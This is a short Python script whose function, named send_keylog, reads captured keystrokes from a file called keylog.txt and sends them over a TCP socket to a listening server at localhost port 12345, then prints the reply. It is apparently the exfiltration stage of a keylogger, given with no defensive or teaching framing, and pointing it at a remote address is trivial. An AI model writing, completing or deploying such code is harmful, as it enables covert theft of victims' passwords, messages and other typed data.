import socket

def send_keylog():
    with open("keylog.txt", "r") as file:
        keylog_data = file.read()

    server_address = ('localhost', 12345)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect(server_address)
        sock.sendall(keylog_data.encode())
        response = sock.recv(1024).decode()
        print(f"Server response: {response}")

if __name__ == "__main__":
    send_keylog()